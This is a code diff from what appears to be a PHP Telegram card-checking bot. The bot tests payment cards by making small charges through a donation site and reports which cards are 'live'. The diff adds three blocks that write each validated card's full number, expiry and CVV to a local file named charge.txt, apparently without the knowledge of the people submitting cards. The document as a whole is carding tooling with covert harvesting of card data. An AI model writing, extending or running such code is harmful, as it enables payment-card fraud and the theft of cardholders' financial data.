@@ -390,10 +390,24 @@ bot('editMessageText', [
         strpos($r3, '"type":"one-time"') ||
         strpos($r3, '/donations/thank_you?donation_number=')
     ) {
+      $data = "$cc|$mes|$ano|$cvv";
+
+        $file = 'Database/charge.txt';
+        $current = file_get_contents($file);
+        $current .= $data . "\n";
+        file_put_contents($file, $current);
+      
         $es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
         $msg = "CARD LOADED";
         $code = "CHARGED 0.01$ SUCCESSFULLY 🟢";
     } elseif (strpos($r3, 'INVALID_BILLING_ADDRESS')) {
+      $data = "$cc|$mes|$ano|$cvv";
+
+$file = 'Database/charge.txt';
+$current = file_get_contents($file);
+$current .= $data . "\n";
+file_put_contents($file, $current);
+      
         $es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
         $msg = "INVALID BILLING ADDRESS";
         $code = "AVS LIVE 🟢";
@@ -402,6 +416,12 @@ bot('editMessageText', [
         $msg = "INVALID SECURITY CODE";
         $code = "CCN LIVE  🟢";
     } elseif (strpos($r3, 'EXISTING_ACCOUNT_RESTRICTED')) {
+      $data = "$cc|$mes|$ano|$cvv";
+
+$file = 'Database/charge.txt';
+$current = file_get_contents($file);
+$current .= $data . "\n";
+file_put_contents($file, $current);
         $es = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
         $msg = "Existing Account Restricted ";
         $code = "-";
